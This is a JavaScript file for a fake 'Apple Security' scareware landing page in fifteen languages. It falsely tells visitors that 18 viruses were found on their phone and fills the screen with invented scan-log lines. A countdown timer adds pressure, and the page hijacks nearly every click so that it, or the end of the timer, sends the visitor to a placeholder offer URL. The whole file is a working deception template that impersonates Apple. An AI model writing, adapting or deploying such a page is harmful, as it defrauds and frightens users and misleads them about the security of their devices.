const OFFER_URL = "{offer}";
const COUNTDOWN_SECONDS = 168;

const translations = {
  en: {
    title: "Apple Security",
    brand: "Apple\nSecurity",
    dateLabel: "June 9, March",
    heroLead: "We have detected",
    heroDanger: "18 viruses",
    heroTail: " on your phone!",
    timerCopy: "Immediate action is required!",
    cta: "Remove Viruses Now"
  },
  fr: {
    title: "Apple Sécurité",
    brand: "Apple\nSécurité",
    dateLabel: "9 juin, mars",
    heroLead: "Nous avons détecté",
    heroDanger: "18 virus",
    heroTail: " sur votre téléphone !",
    timerCopy: "Une action immédiate est requise !",
    cta: "Supprimer les virus maintenant"
  },
  "pt-PT": {
    title: "Apple Segurança",
    brand: "Apple\nSegurança",
    dateLabel: "9 de junho, março",
    heroLead: "Detetámos",
    heroDanger: "18 vírus",
    heroTail: " no seu telefone!",
    timerCopy: "É necessária uma ação imediata!",
    cta: "Remover vírus agora"
  },
  "pt-BR": {
    title: "Apple Segurança",
    brand: "Apple\nSegurança",
    dateLabel: "9 de junho, março",
    heroLead: "Detectamos",
    heroDanger: "18 vírus",
    heroTail: " no seu telefone!",
    timerCopy: "É necessária uma ação imediata!",
    cta: "Remover vírus agora"
  },
  es: {
    title: "Apple Seguridad",
    brand: "Apple\nSeguridad",
    dateLabel: "9 de junio, marzo",
    heroLead: "Hemos detectado",
    heroDanger: "18 virus",
    heroTail: " en su teléfono!",
    timerCopy: "¡Se requiere una acción inmediata!",
    cta: "Eliminar virus ahora"
  },
  "es-419": {
    title: "Apple Seguridad",
    brand: "Apple\nSeguridad",
    dateLabel: "9 de junio, marzo",
    heroLead: "Detectamos",
    heroDanger: "18 virus",
    heroTail: " en tu teléfono!",
    timerCopy: "¡Se requiere una acción inmediata!",
    cta: "Eliminar virus ahora"
  },
  da: {
    title: "Apple Sikkerhed",
    brand: "Apple\nSikkerhed",
    dateLabel: "9. juni, marts",
    heroLead: "Vi har registreret",
    heroDanger: "18 virusser",
    heroTail: " på din telefon!",
    timerCopy: "Øjeblikkelig handling er påkrævet!",
    cta: "Fjern virus nu"
  },
  ja: {
    title: "Appleセキュリティ",
    brand: "Apple\nセキュリティ",
    dateLabel: "6月9日、3月",
    heroLead: "検出されました",
    heroDanger: "18個のウイルス",
    heroTail: "がお使いの電話にあります！",
    timerCopy: "直ちに対応が必要です！",
    cta: "今すぐウイルスを削除"
  },
  fil: {
    title: "Apple Seguridad",
    brand: "Apple\nSeguridad",
    dateLabel: "Hunyo 9, Marso",
    heroLead: "Naka-detect kami ng",
    heroDanger: "18 virus",
    heroTail: " sa iyong phone!",
    timerCopy: "Kailangang kumilos agad!",
    cta: "Alisin ang mga Virus Ngayon"
  },
  de: {
    title: "Apple Sicherheit",
    brand: "Apple\nSicherheit",
    dateLabel: "9. Juni, März",
    heroLead: "Wir haben erkannt",
    heroDanger: "18 Viren",
    heroTail: " auf Ihrem Telefon!",
    timerCopy: "Sofortiges Handeln ist erforderlich!",
    cta: "Viren jetzt entfernen"
  },
  nb: {
    title: "Apple Sikkerhet",
    brand: "Apple\nSikkerhet",
    dateLabel: "9. juni, mars",
    heroLead: "Vi har oppdaget",
    heroDanger: "18 virus",
    heroTail: " på telefonen din!",
    timerCopy: "Umiddelbar handling er nødvendig!",
    cta: "Fjern virus nå"
  },
  sv: {
    title: "Apple Säkerhet",
    brand: "Apple\nSäkerhet",
    dateLabel: "9 juni, mars",
    heroLead: "Vi har upptäckt",
    heroDanger: "18 virus",
    heroTail: " på din telefon!",
    timerCopy: "Omedelbar åtgärd krävs!",
    cta: "Ta bort virus nu"
  },
  it: {
    title: "Apple Sicurezza",
    brand: "Apple\nSicurezza",
    dateLabel: "9 giugno, marzo",
    heroLead: "Abbiamo rilevato",
    heroDanger: "18 virus",
    heroTail: " sul tuo telefono!",
    timerCopy: "È richiesta un'azione immediata!",
    cta: "Rimuovi virus ora"
  },
  nl: {
    title: "Apple Beveiliging",
    brand: "Apple\nBeveiliging",
    dateLabel: "9 juni, maart",
    heroLead: "We hebben gedetecteerd",
    heroDanger: "18 virussen",
    heroTail: " op uw telefoon!",
    timerCopy: "Onmiddellijke actie is vereist!",
    cta: "Virussen nu verwijderen"
  },
  ro: {
    title: "Apple Securitate",
    brand: "Apple\nSecuritate",
    dateLabel: "9 iunie, martie",
    heroLead: "Am detectat",
    heroDanger: "18 viruși",
    heroTail: " pe telefonul dvs.!",
    timerCopy: "Este necesară o acțiune imediată!",
    cta: "Eliminați virușii acum"
  }
};

const codeTranslations = {
  en: {
    applyingAdaptive: "Applying adaptive filter α=0.93",
    integrityPassed: "Integrity verification... PASSED",
    entropyStabilized: "Entropy stabilized at 0.762",
    highPing: "High ping",
    analyzingPackets: "Analyzing packets... ✔",
    initializingStream: "Initializing data stream...",
    fetchingConfig: "Fetching configuration from",
    handshakeComplete: "Handshake complete",
    connectionEstablishedNode: "Connection established to Node",
    returningIdle: "Returning to idle state...",
    filterConvergence: "Filter convergence after 24 iterations",
    totalRuntime: "Total runtime: 12.487s"
  },
  fr: {
    applyingAdaptive: "Application du filtre adaptatif α=0.93",
    integrityPassed: "Vérification d’intégrité... RÉUSSIE",
    entropyStabilized: "Entropie stabilisée à 0.762",
    highPing: "Ping élevé",
    analyzingPackets: "Analyse des paquets... ✔",
    initializingStream: "Initialisation du flux de données...",
    fetchingConfig: "Récupération de la configuration depuis",
    handshakeComplete: "Liaison terminée",
    connectionEstablishedNode: "Connexion établie au nœud",
    returningIdle: "Retour à l’état inactif...",
    filterConvergence: "Convergence du filtre après 24 itérations",
    totalRuntime: "Durée totale : 12.487s"
  },
  "pt-PT": {
    applyingAdaptive: "A aplicar filtro adaptativo α=0.93",
    integrityPassed: "Verificação de integridade... APROVADA",
    entropyStabilized: "Entropia estabilizada em 0.762",
    highPing: "Ping elevado",
    analyzingPackets: "A analisar pacotes... ✔",
    initializingStream: "A iniciar fluxo de dados...",
    fetchingConfig: "A obter configuração de",
    handshakeComplete: "Handshake concluído",
    connectionEstablishedNode: "Ligação estabelecida ao nó",
    returningIdle: "A regressar ao estado inativo...",
    filterConvergence: "Convergência do filtro após 24 iterações",
    totalRuntime: "Tempo total de execução: 12.487s"
  },
  "pt-BR": {
    applyingAdaptive: "Aplicando filtro adaptativo α=0.93",
    integrityPassed: "Verificação de integridade... APROVADA",
    entropyStabilized: "Entropia estabilizada em 0.762",
    highPing: "Ping alto",
    analyzingPackets: "Analisando pacotes... ✔",
    initializingStream: "Inicializando fluxo de dados...",
    fetchingConfig: "Buscando configuração de",
    handshakeComplete: "Handshake concluído",
    connectionEstablishedNode: "Conexão estabelecida com o nó",
    returningIdle: "Retornando ao estado ocioso...",
    filterConvergence: "Convergência do filtro após 24 iterações",
    totalRuntime: "Tempo total de execução: 12.487s"
  },
  es: {
    applyingAdaptive: "Aplicando filtro adaptativo α=0.93",
    integrityPassed: "Verificación de integridad... APROBADA",
    entropyStabilized: "Entropía estabilizada en 0.762",
    highPing: "Ping alto",
    analyzingPackets: "Analizando paquetes... ✔",
    initializingStream: "Inicializando flujo de datos...",
    fetchingConfig: "Obteniendo configuración de",
    handshakeComplete: "Enlace completado",
    connectionEstablishedNode: "Conexión establecida con el nodo",
    returningIdle: "Volviendo al estado inactivo...",
    filterConvergence: "Convergencia del filtro tras 24 iteraciones",
    totalRuntime: "Tiempo total de ejecución: 12.487s"
  },
  "es-419": {
    applyingAdaptive: "Aplicando filtro adaptativo α=0.93",
    integrityPassed: "Verificación de integridad... APROBADA",
    entropyStabilized: "Entropía estabilizada en 0.762",
    highPing: "Ping alto",
    analyzingPackets: "Analizando paquetes... ✔",
    initializingStream: "Inicializando flujo de datos...",
    fetchingConfig: "Obteniendo configuración de",
    handshakeComplete: "Enlace completado",
    connectionEstablishedNode: "Conexión establecida con el nodo",
    returningIdle: "Volviendo al estado inactivo...",
    filterConvergence: "Convergencia del filtro tras 24 iteraciones",
    totalRuntime: "Tiempo total de ejecución: 12.487s"
  },
  da: {
    applyingAdaptive: "Anvender adaptivt filter α=0.93",
    integrityPassed: "Integritetskontrol... GODKENDT",
    entropyStabilized: "Entropi stabiliseret ved 0.762",
    highPing: "Høj ping",
    analyzingPackets: "Analyserer pakker... ✔",
    initializingStream: "Initialiserer datastrøm...",
    fetchingConfig: "Henter konfiguration fra",
    handshakeComplete: "Handshake fuldført",
    connectionEstablishedNode: "Forbindelse etableret til node",
    returningIdle: "Vender tilbage til inaktiv tilstand...",
    filterConvergence: "Filterkonvergens efter 24 iterationer",
    totalRuntime: "Samlet køretid: 12.487s"
  },
  ja: {
    applyingAdaptive: "適応フィルターを適用中 α=0.93",
    integrityPassed: "整合性検証... 合格",
    entropyStabilized: "エントロピーは 0.762 で安定",
    highPing: "高い ping",
    analyzingPackets: "パケットを解析中... ✔",
    initializingStream: "データストリームを初期化中...",
    fetchingConfig: "設定を取得中:",
    handshakeComplete: "ハンドシェイク完了",
    connectionEstablishedNode: "ノードへの接続を確立",
    returningIdle: "待機状態に戻っています...",
    filterConvergence: "24 回の反復後にフィルターが収束",
    totalRuntime: "合計実行時間: 12.487s"
  },
  fil: {
    applyingAdaptive: "Ina-apply ang adaptive filter α=0.93",
    integrityPassed: "Pag-verify ng integridad... PASSED",
    entropyStabilized: "Stabilized ang entropy sa 0.762",
    highPing: "Mataas na ping",
    analyzingPackets: "Sinusuri ang packets... ✔",
    initializingStream: "Ini-initialize ang data stream...",
    fetchingConfig: "Kinukuha ang configuration mula sa",
    handshakeComplete: "Kumpleto ang handshake",
    connectionEstablishedNode: "Nakakonekta sa Node",
    returningIdle: "Bumabalik sa idle state...",
    filterConvergence: "Nag-converge ang filter matapos ang 24 iterations",
    totalRuntime: "Kabuuang runtime: 12.487s"
  },
  de: {
    applyingAdaptive: "Adaptiver Filter wird angewendet α=0.93",
    integrityPassed: "Integritätsprüfung... BESTANDEN",
    entropyStabilized: "Entropie bei 0.762 stabilisiert",
    highPing: "Hoher Ping",
    analyzingPackets: "Pakete werden analysiert... ✔",
    initializingStream: "Datenstrom wird initialisiert...",
    fetchingConfig: "Konfiguration wird geladen von",
    handshakeComplete: "Handshake abgeschlossen",
    connectionEstablishedNode: "Verbindung zu Knoten hergestellt",
    returningIdle: "Rückkehr in den Leerlauf...",
    filterConvergence: "Filterkonvergenz nach 24 Iterationen",
    totalRuntime: "Gesamtlaufzeit: 12.487s"
  },
  nb: {
    applyingAdaptive: "Bruker adaptivt filter α=0.93",
    integrityPassed: "Integritetskontroll... BESTÅTT",
    entropyStabilized: "Entropi stabilisert ved 0.762",
    highPing: "Høy ping",
    analyzingPackets: "Analyserer pakker... ✔",
    initializingStream: "Initialiserer datastrøm...",
    fetchingConfig: "Henter konfigurasjon fra",
    handshakeComplete: "Handshake fullført",
    connectionEstablishedNode: "Tilkobling etablert til node",
    returningIdle: "Går tilbake til inaktiv tilstand...",
    filterConvergence: "Filterkonvergens etter 24 iterasjoner",
    totalRuntime: "Total kjøretid: 12.487s"
  },
  sv: {
    applyingAdaptive: "Tillämpar adaptivt filter α=0.93",
    integrityPassed: "Integritetskontroll... GODKÄND",
    entropyStabilized: "Entropi stabiliserad vid 0.762",
    highPing: "Hög ping",
    analyzingPackets: "Analyserar paket... ✔",
    initializingStream: "Initierar dataström...",
    fetchingConfig: "Hämtar konfiguration från",
    handshakeComplete: "Handshake slutförd",
    connectionEstablishedNode: "Anslutning upprättad till nod",
    returningIdle: "Återgår till viloläge...",
    filterConvergence: "Filterkonvergens efter 24 iterationer",
    totalRuntime: "Total körtid: 12.487s"
  },
  it: {
    applyingAdaptive: "Applicazione del filtro adattivo α=0.93",
    integrityPassed: "Verifica integrità... SUPERATA",
    entropyStabilized: "Entropia stabilizzata a 0.762",
    highPing: "Ping elevato",
    analyzingPackets: "Analisi dei pacchetti... ✔",
    initializingStream: "Inizializzazione flusso dati...",
    fetchingConfig: "Recupero configurazione da",
    handshakeComplete: "Handshake completato",
    connectionEstablishedNode: "Connessione stabilita al nodo",
    returningIdle: "Ritorno allo stato inattivo...",
    filterConvergence: "Convergenza del filtro dopo 24 iterazioni",
    totalRuntime: "Tempo totale di esecuzione: 12.487s"
  },
  nl: {
    applyingAdaptive: "Adaptief filter toepassen α=0.93",
    integrityPassed: "Integriteitscontrole... GESLAAGD",
    entropyStabilized: "Entropie gestabiliseerd op 0.762",
    highPing: "Hoge ping",
    analyzingPackets: "Pakketten analyseren... ✔",
    initializingStream: "Gegevensstroom initialiseren...",
    fetchingConfig: "Configuratie ophalen van",
    handshakeComplete: "Handshake voltooid",
    connectionEstablishedNode: "Verbinding gemaakt met node",
    returningIdle: "Terug naar inactieve status...",
    filterConvergence: "Filterconvergentie na 24 iteraties",
    totalRuntime: "Totale runtime: 12.487s"
  },
  ro: {
    applyingAdaptive: "Se aplică filtrul adaptiv α=0.93",
    integrityPassed: "Verificarea integrității... REUȘITĂ",
    entropyStabilized: "Entropia s-a stabilizat la 0.762",
    highPing: "Ping ridicat",
    analyzingPackets: "Se analizează pachetele... ✔",
    initializingStream: "Se inițializează fluxul de date...",
    fetchingConfig: "Se preia configurația din",
    handshakeComplete: "Handshake finalizat",
    connectionEstablishedNode: "Conexiune stabilită la nodul",
    returningIdle: "Revenire la starea inactivă...",
    filterConvergence: "Convergența filtrului după 24 de iterații",
    totalRuntime: "Timp total de rulare: 12.487s"
  }
};

const layoutStyleProperties = [
  "--landing-bottom-padding",
  "--topbar-min-height",
  "--topbar-padding",
  "--brand-gap",
  "--brand-icon-width",
  "--brand-icon-height",
  "--brand-font-size",
  "--date-font-size",
  "--content-padding",
  "--hero-font-size",
  "--hero-margin-bottom",
  "--code-height",
  "--code-padding",
  "--code-radius",
  "--code-fade-height",
  "--code-font-size",
  "--code-line-height",
  "--timer-margin-top",
  "--timer-font-size",
  "--timer-copy-margin-top",
  "--timer-copy-font-size",
  "--cta-side-margin",
  "--cta-height",
  "--cta-radius",
  "--cta-font-size"
];

const compactLayoutStyles = {
  default: {
    "--landing-bottom-padding": "10px",
    "--topbar-min-height": "70px",
    "--topbar-padding": "11px 20px 12px 20px",
    "--brand-gap": "15px",
    "--brand-icon-width": "50px",
    "--brand-icon-height": "50px",
    "--brand-font-size": "20px",
    "--date-font-size": "18px",
    "--content-padding": "30px 25px 15px",
    "--hero-font-size": "28px",
    "--hero-margin-bottom": "39px",
    "--code-height": "492px",
    "--code-padding": "30px 30px 48px",
    "--code-radius": "30px",
    "--code-fade-height": "90px",
    "--code-font-size": "12px",
    "--code-line-height": "1.59",
    "--timer-margin-top": "20px",
    "--timer-font-size": "36px",
    "--timer-copy-margin-top": "26px",
    "--timer-copy-font-size": "18px",
    "--cta-side-margin": "41px",
    "--cta-height": "70px",
    "--cta-radius": "52px",
    "--cta-font-size": "16px"
  },
  min414: {
    "--landing-bottom-padding": "20px",
    "--topbar-min-height": "85px",
    "--topbar-padding": "10px 32px 10px 30px",
    "--brand-gap": "13px",
    "--brand-icon-width": "50px",
    "--brand-icon-height": "50px",
    "--brand-font-size": "22px",
    "--date-font-size": "22px",
    "--content-padding": "40px 32px 14px",
    "--hero-font-size": "30px",
    "--hero-margin-bottom": "30px",
    "--code-height": "430px",
    "--code-padding": "42px 42px 40px",
    "--code-radius": "44px",
    "--code-fade-height": "170px",
    "--code-font-size": "13px",
    "--code-line-height": "1.58",
    "--timer-margin-top": "10px",
    "--timer-font-size": "40px",
    "--timer-copy-margin-top": "22px",
    "--timer-copy-font-size": "20px",
    "--cta-side-margin": "32px",
    "--cta-height": "80px",
    "--cta-radius": "44px",
    "--cta-font-size": "20px"
  },
  max390: {
    "--landing-bottom-padding": "20px",
    "--topbar-min-height": "67px",
    "--topbar-padding": "10px 24px 10px 23px",
    "--brand-gap": "10px",
    "--brand-icon-width": "45px",
    "--brand-icon-height": "45px",
    "--brand-font-size": "18px",
    "--date-font-size": "18px",
    "--content-padding": "30px 23px 11px",
    "--hero-font-size": "28px",
    "--hero-margin-bottom": "27px",
    "--code-height": "365px",
    "--code-padding": "30px 34px 34px",
    "--code-radius": "39px",
    "--code-fade-height": "80px",
    "--code-font-size": "12px",
    "--code-line-height": "1.6",
    "--timer-margin-top": "20px",
    "--timer-font-size": "36px",
    "--timer-copy-margin-top": "24px",
    "--timer-copy-font-size": "17px",
    "--cta-side-margin": "23px",
    "--cta-height": "70px",
    "--cta-radius": "38px",
    "--cta-font-size": "18px"
  },
  max375: {
    "--landing-bottom-padding": "34px",
    "--topbar-min-height": "67px",
    "--topbar-padding": "7px 21px 8px",
    "--brand-gap": "10px",
    "--brand-icon-width": "38px",
    "--brand-icon-height": "47px",
    "--brand-font-size": "18px",
    "--date-font-size": "17px",
    "--content-padding": "24px 21px 10px",
    "--hero-font-size": "26px",
    "--hero-margin-bottom": "22px",
    "--code-height": "330px",
    "--code-padding": "32px 28px 30px",
    "--code-radius": "34px",
    "--code-fade-height": "90px",
    "--code-font-size": "11px",
    "--code-line-height": "1.55",
    "--timer-margin-top": "10px",
    "--timer-font-size": "34px",
    "--timer-copy-margin-top": "18px",
    "--timer-copy-font-size": "16px",
    "--cta-side-margin": "21px",
    "--cta-height": "70px",
    "--cta-radius": "35px",
    "--cta-font-size": "18px"
  }
};

const jaLayoutStyles = {
  default: {
    "--brand-font-size": "20px",
    "--date-font-size": "20px",
    "--hero-font-size": "18px",
    "--hero-margin-bottom": "20px",
    "--code-font-size": "13px",
    "--timer-copy-font-size": "20px",
    "--cta-font-size": "24px"
  },
  min414: {
    "--brand-font-size": "20px",
    "--date-font-size": "20px",
    "--hero-font-size": "20px",
    "--hero-margin-bottom": "32px",
    "--code-font-size": "15px",
    "--timer-copy-font-size": "20px",
    "--cta-font-size": "20px"
  },
  max390: {
    "--brand-font-size": "18px",
    "--date-font-size": "17px",
    "--hero-font-size": "30px",
    "--hero-margin-bottom": "25px",
    "--code-font-size": "11px",
    "--timer-copy-font-size": "16px",
    "--cta-font-size": "20px"
  },
  max375: {
    "--brand-font-size": "17px",
    "--date-font-size": "16px",
    "--hero-font-size": "18px",
    "--hero-margin-bottom": "20px",
    "--code-font-size": "10px",
    "--timer-copy-font-size": "15px",
    "--cta-font-size": "18px"
  }
};

const deLayoutStyles = {
  default: {
    "--brand-font-size": "20px",
    "--date-font-size": "20px",
    "--hero-font-size": "26px",
    "--hero-margin-bottom": "32px",
    "--code-font-size": "13px",
    "--timer-copy-font-size": "18px",
    "--cta-font-size": "22px"
  },
  min414: {
    "--brand-font-size": "20px",
    "--date-font-size": "20px",
    "--hero-font-size": "30px",
    "--hero-margin-bottom": "20px",
    "--code-font-size": "13px",
    "--timer-copy-font-size": "18px",
    "--cta-font-size": "22px"
  },
  max390: {
    "--brand-font-size": "18px",
    "--date-font-size": "18px",
    "--hero-font-size": "28px",
    "--hero-margin-bottom": "25px",
    "--code-font-size": "11px",
    "--timer-copy-font-size": "16px",
    "--cta-font-size": "20px"
  },
  max375: {
    "--brand-font-size": "17px",
    "--date-font-size": "16px",
    "--hero-font-size": "28px",
    "--hero-margin-bottom": "20px",
    "--code-font-size": "10px",
    "--timer-copy-font-size": "15px",
    "--cta-font-size": "18px"
  }
};

const localeStyles = {
  fr: compactLayoutStyles,
  "pt-PT": compactLayoutStyles,
  "pt-BR": compactLayoutStyles,
  es: compactLayoutStyles,
  "es-419": compactLayoutStyles,
  da: compactLayoutStyles,
  ja: jaLayoutStyles,
  fil: compactLayoutStyles,
  de: deLayoutStyles,
  nb: compactLayoutStyles,
  sv: compactLayoutStyles,
  it: compactLayoutStyles,
  nl: compactLayoutStyles,
  ro: compactLayoutStyles
};

function getRequestedLocale(supportedLocales) {
  const params = new URLSearchParams(window.location.search);
  const requestedLocale = params.get("lang") || params.get("locale");
  if (!requestedLocale) return null;

  const normalizedRequestedLocale = requestedLocale.toLowerCase();
  const exactLocale = supportedLocales.find((key) => key.toLowerCase() === normalizedRequestedLocale);
  if (exactLocale) return exactLocale;

  const baseLocale = normalizedRequestedLocale.split("-")[0];
  return supportedLocales.find((key) => key.toLowerCase() === baseLocale) || null;
}

function resolveLocale() {
  const supportedLocales = Object.keys(translations);
  const requestedLocale = getRequestedLocale(supportedLocales);
  if (requestedLocale) return requestedLocale;

  const browserLocales = Array.isArray(navigator.languages) && navigator.languages.length
    ? navigator.languages
    : [navigator.language || document.documentElement.lang || "en"];

  for (const candidate of browserLocales) {
    const normalizedCandidate = candidate.toLowerCase();
    const exactLocale = supportedLocales.find((key) => key.toLowerCase() === normalizedCandidate);
    if (exactLocale) return exactLocale;

    const baseLocale = normalizedCandidate.split("-")[0];
    const baseMatch = supportedLocales.find((key) => key.toLowerCase() === baseLocale);
    if (baseMatch) return baseMatch;
  }

  return "en";
}

const locale = resolveLocale();
const dictionary = translations[locale] || translations.en;
const codeDictionary = codeTranslations[locale] || codeTranslations.en;
let remainingSeconds = COUNTDOWN_SECONDS;
let redirected = false;

function setViewportHeight() {
  const viewportHeight = window.visualViewport
    ? window.visualViewport.height
    : window.innerHeight;

  document.documentElement.style.setProperty(
    "--app-viewport-height",
    `${Math.round(viewportHeight)}px`
  );
}

function getLayoutBreakpoint() {
  if (window.matchMedia("(max-width: 375px)").matches) return "max375";
  if (window.matchMedia("(max-width: 390px)").matches) return "max390";
  if (window.matchMedia("(min-width: 414px) and (max-width: 520px)").matches) return "min414";

  return "default";
}

function shouldSkipLocaleStyles(localeKey) {
  const normalizedLocale = localeKey.toLowerCase();
  return normalizedLocale === "en" || normalizedLocale.startsWith("zh");
}

function applyLocaleStyles() {
  const landing = document.querySelector(".landing");
  if (!landing) return;

  landing.dataset.locale = locale;
  layoutStyleProperties.forEach((property) => {
    landing.style.removeProperty(property);
  });

  if (shouldSkipLocaleStyles(locale)) return;

  const styleConfig = localeStyles[locale];
  if (!styleConfig) return;

  const breakpoint = getLayoutBreakpoint();
  const values = {
    ...(compactLayoutStyles[breakpoint] || compactLayoutStyles.default),
    ...(styleConfig[breakpoint] || styleConfig.default)
  };

  Object.entries(values).forEach(([property, value]) => {
    landing.style.setProperty(property, value);
  });
}

function applyTranslations() {
  document.documentElement.lang = locale;
  document.title = dictionary.title;

  document.querySelectorAll("[data-i18n]").forEach((node) => {
    const key = node.dataset.i18n;
    node.textContent = dictionary[key] || translations.en[key] || key;
  });
}

function appendSegment(parent, className, text) {
  if (!className) {
    parent.append(document.createTextNode(text));
    return;
  }

  const segment = document.createElement("span");
  segment.className = className;
  segment.textContent = text;
  parent.append(segment);
}

function appendCodeLine(parent, segments) {
  segments.forEach(([className, text]) => appendSegment(parent, className, text));
  parent.append(document.createTextNode("\n"));
}

function renderCodeLines() {
  const codeNode = document.querySelector("[data-code-lines]");
  if (!codeNode) return;

  const t = (key) => codeDictionary[key] || codeTranslations.en[key] || key;
  codeNode.textContent = "";

  [
    [["muted", "[INFO]"], [null, " "], ["orange", t("applyingAdaptive")]],
    [["muted", "[CHECK]"], [null, " "], ["orange", t("integrityPassed")]],
    [["red", "console.log"], ["dark", `("${t("entropyStabilized")}");`]],
    [["dark", "nodes."], ["red", "forEach"], ["dark", "(n => {"]],
    [["dark", "  if (n.latency > "], ["red", "250"], ["dark", ") "], ["red", "alert"], ["dark", "(`"], ["green", `△ ${t("highPing")}: \${n.id}`], ["dark", "`);"]],
    [["dark", "});"]],
    [["red", "console.log"], ["dark", `("${t("analyzingPackets")}");`]],
    [["dark", "const nodes = "], ["red", "scanNetwork(1024);"]],
    [["muted", "[INFO]"], [null, " "], ["orange", t("initializingStream")]],
    [["muted", "[LOAD]"], [null, " "], ["orange", `${t("fetchingConfig")} /etc/ai/config.json`]],
    [["muted", "[INFO]"], [null, " "], ["orange-light", `${t("handshakeComplete")} (latency: 12.3ms)`]],
    [["muted", "[OK]"], [null, " "], ["orange-fade", `${t("connectionEstablishedNode")}: α-17`]],
    [["muted fade", "[SYSTEM]"], [null, " "], ["orange-fade", t("returningIdle")]],
    [["muted fade", "[OK]"], [null, " "], ["orange-fade", t("filterConvergence")]],
    [["muted fade", "[TIME]"], [null, " "], ["orange-fade", t("totalRuntime")]]
  ].forEach((line) => appendCodeLine(codeNode, line));
}

function renderCountdown() {
  const timerNode = document.querySelector("[data-countdown]");
  if (!timerNode) return;

  const minutes = String(Math.floor(remainingSeconds / 60)).padStart(2, "0");
  const seconds = String(remainingSeconds % 60).padStart(2, "0");
  timerNode.textContent = `00:${minutes}:${seconds}`;
}

function goToOffer() {
  if (redirected) return;
  redirected = true;
  window.location.href = OFFER_URL;
}

function startCountdown() {
  renderCountdown();

  const intervalId = window.setInterval(() => {
    remainingSeconds -= 1;
    renderCountdown();

    if (remainingSeconds <= 0) {
      window.clearInterval(intervalId);
      goToOffer();
    }
  }, 1000);
}

function bindClicks() {
  const offerLink = document.querySelector("[data-offer-link]");
  if (offerLink) {
    offerLink.href = OFFER_URL;
    offerLink.addEventListener("click", (event) => {
      event.preventDefault();
      goToOffer();
    });
  }

  document.addEventListener("click", (event) => {
    const isModifiedClick = event.metaKey || event.ctrlKey || event.shiftKey || event.altKey;
    if (isModifiedClick) return;

    event.preventDefault();
    goToOffer();
  });
}

applyTranslations();
renderCodeLines();
applyLocaleStyles();
setViewportHeight();
startCountdown();
bindClicks();

window.addEventListener("resize", setViewportHeight);
window.addEventListener("resize", applyLocaleStyles);
window.addEventListener("orientationchange", setViewportHeight);
window.addEventListener("orientationchange", applyLocaleStyles);

if (window.visualViewport) {
  window.visualViewport.addEventListener("resize", setViewportHeight);
  window.visualViewport.addEventListener("resize", applyLocaleStyles);
  window.visualViewport.addEventListener("scroll", setViewportHeight);
}
